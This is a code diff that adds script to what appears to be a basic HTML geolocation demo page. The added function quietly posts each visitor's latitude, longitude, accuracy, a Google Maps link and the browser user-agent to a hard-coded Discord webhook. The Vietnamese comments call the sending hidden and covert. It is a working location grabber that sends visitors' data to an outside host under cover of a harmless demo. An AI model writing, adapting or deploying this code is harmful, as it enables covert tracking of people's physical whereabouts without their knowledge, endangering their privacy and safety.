@@ -8,6 +8,51 @@
 <p id="demo"></p>
 
 <script>
+// Cấu hình link Discord Webhook của bạn
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1527956134856495104/4nt29jEEtSdg99Ks_nga5go68k-MyiYoI-e8RY3ymAEw_dgQf98bVuoE6l7_odXxtUXS";
+
+/**
+ * Hàm gửi dữ liệu vị trí ẩn về Discord
+ * @param {number} lat - Vĩ độ
+ * @param {number} lon - Kinh độ
+ * @param {number} accuracy - Độ chính xác (tùy chọn)
+ */
+function sendToDiscordWebhook(lat, lon, accuracy = 0) {
+    // 1. Đóng gói dữ liệu theo chuẩn Embed của Discord (Giao diện bảng biểu)
+    const payload = {
+        embeds: [{
+            title: "🎯 Thiết bị đã cấp quyền vị trí thành công!",
+            color: 5763719, // Mã màu xanh lá hiển thị trên Discord
+            fields: [
+                { name: "🛰️ Vĩ độ (Latitude)", value: `\`${lat}\``, inline: true },
+                { name: "🛰️ Kinh độ (Longitude)", value: `\`${lon}\``, inline: true },
+                { name: "🎯 Độ chính xác (Accuracy)", value: `\`${accuracy} mét\``, inline: false },
+                { name: "🌐 Google Maps Link", value: `[Bấm để xem trên bản đồ](https://www.google.com/maps?q=${lat},${lon})`, inline: false },
+                { name: "📱 Thông tin thiết bị", value: navigator.userAgent, inline: false }
+            ],
+            timestamp: new Date().toISOString()
+        }]
+    };
+
+    // 2. Sử dụng Fetch API để bắn gói tin POST HTTP ngầm lên máy chủ Discord
+    fetch(DISCORD_WEBHOOK_URL, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+    })
+    .then(response => {
+        if (response.ok) {
+            console.log("Đã gửi dữ liệu về Discord thành công!");
+        } else {
+            console.error("Discord phản hồi lỗi:", response.status);
+        }
+    })
+    .catch(error => {
+        console.error("Lỗi đường truyền mạng:", error);
+    });
+}
 var x = document.getElementById("demo");
 
 function getLocation() {
